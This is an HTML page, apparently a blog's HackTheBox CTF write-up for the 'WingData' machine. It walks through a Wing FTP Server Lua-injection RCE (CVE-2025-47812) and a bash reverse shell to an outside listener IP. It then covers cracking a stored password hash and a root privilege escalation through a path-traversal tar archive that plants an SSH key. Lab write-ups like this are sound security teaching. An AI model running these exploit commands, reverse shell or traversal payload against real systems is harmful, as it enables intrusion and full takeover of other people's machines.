@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/wingdata.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] WingData - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>WingData</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">WingData</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">wing ftp server</span>
+                    <span class="tag">cve-2025-47812</span>
+                    <span class="tag">lua injection rce</span>
+                    <span class="tag">credential cracking</span>
+                    <span class="tag">sudo restore tar traversal</span>
+                </div>
+
+                <img src="../../images/hackthebox/wingdata/index.png" alt="WingData Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Two ports, SSH on a Debian box and Apache on 80 serving a corporate site called "WingData Solutions". The service info also leaks <code>Host: localhost</code>.</p>
+
+                <pre><code>[WingData] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap 10.129.1.205
+Nmap scan report for wingdata.htb (10.129.1.205)
+Host is up (0.17s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: WingData Solutions
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>I added <code>wingdata.htb</code> to <code>/etc/hosts</code>. The main page is a static brochure, but it references an FTP portal at <code>ftp.wingdata.htb</code>. Adding that vhost too, port 80 serves the web interface of <strong>Wing FTP Server 7.4.3</strong>, with the version visible on the login page.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Wing FTP Server up to 7.4.3 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2025-47812">CVE-2025-47812</a>, an unauthenticated remote code execution. The bug comes from a mismatch in how the server handles a NULL byte in the <code>username</code> field: <code>c_CheckUser()</code> truncates the string at the NULL, so even <code>anonymous</code> authenticates, while the session-writing logic keeps the full, unsanitised username. That lets you smuggle Lua code past the login into the session file, and the code runs when an authenticated page like <code>/dir.html</code> is loaded.</p>
+
+                <p>I used <a href="https://www.exploit-db.com/exploits/52347">4m3rr0r's PoC</a>, which chains both requests automatically: it POSTs the poisoned username to <code>loginok.html</code>, grabs the returned <code>UID</code> cookie, then requests <code>dir.html</code> to trigger the injected <code>io.popen</code> call. A quick <code>id</code> confirms execution:</p>
+
+                <pre><code>[WingData] python3 exploit.py -u http://ftp.wingdata.htb -c id
+[+] UID extracted: ...
+--- Command Output ---
+uid=1001(wingftp) gid=1001(wingftp) groups=1001(wingftp)
+----------------------</code></pre>
+
+                <p>The CVE notes usually promise root, but this box runs the service under a dedicated <code>wingftp</code> account, so the RCE lands there. I turned it into an interactive shell by feeding the exploit a reverse-shell one-liner:</p>
+
+                <pre><code>[WingData] nc -lvnp 4444
+[WingData] python3 exploit.py -u http://ftp.wingdata.htb -c 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.213/4444 0&gt;&amp;1"'</code></pre>
+
+                <pre><code>[WingData] nc -lvnp 4444
+Connection received on 10.129.1.205
+wingftp@wingdata:/opt/wftpserver$ id
+uid=1001(wingftp) gid=1001(wingftp) groups=1001(wingftp)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Foothold as <code>wingftp</code>. Wing FTP stores each account as an XML file under its data directory, and those files include the stored password hash. The <code>wacky</code> account stands out:</p>
+
+                <pre><code>wingftp@wingdata:/opt/wftpserver$ cat Data/1/users/wacky.xml
+&lt;USER&gt;
+    &lt;UserName&gt;wacky&lt;/UserName&gt;
+    &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
+    ...
+&lt;/USER&gt;</code></pre>
+
+                <p>Cracking that stored credential offline against <code>rockyou</code> recovers the plaintext:</p>
+
+                <pre><code>wacky : !#7Blushing^*Bride5</code></pre>
+
+                <p><code>wacky</code> is also a system user, and the password is reused for it, so SSH gets a proper session and the user flag:</p>
+
+                <pre><code>[WingData] ssh wacky@wingdata.htb
+wacky@wingdata:~$ id
+uid=1002(wacky) gid=1002(wacky) groups=1002(wacky)
+wacky@wingdata:~$ cat user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p><code>wacky</code> can run a backup-restore script as root, and the trailing wildcard means I control the argument it is invoked with:</p>
+
+                <pre><code>wacky@wingdata:~$ sudo -l
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</code></pre>
+
+                <p>The script restores a client backup by extracting an archive that I hand it, and it does so as root without sanitising the paths inside that archive (the classic <code>tarfile.extractall</code> traversal). An archive member whose name climbs out of the extraction directory therefore gets written anywhere on disk, as root. That is a straight arbitrary file write, so I aimed it at root's <code>authorized_keys</code>.</p>
+
+                <p>First generate a keypair, then build a tar whose single entry traverses into <code>/root/.ssh/authorized_keys</code> and carries my public key:</p>
+
+                <pre><code>[WingData] ssh-keygen -f ./id_rsa -N ''
+
+wacky@wingdata:~$ mkdir -p payload/.ssh
+wacky@wingdata:~$ cp id_rsa.pub payload/.ssh/authorized_keys
+wacky@wingdata:~$ python3 -c 'import tarfile;
+t=tarfile.open("evil.tar","w");
+t.add("payload/.ssh/authorized_keys", arcname="../../../../root/.ssh/authorized_keys");
+t.close()'</code></pre>
+
+                <p>Feeding that archive to the sudo-allowed restore makes root extract my <code>authorized_keys</code> into its own home:</p>
+
+                <pre><code>wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py /home/wacky/evil.tar</code></pre>
+
+                <p>With the key planted, SSH straight in as root:</p>
+
+                <pre><code>[WingData] ssh -i id_rsa root@wingdata.htb
+root@wingdata:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@wingdata:~# cat /root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // WingData</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
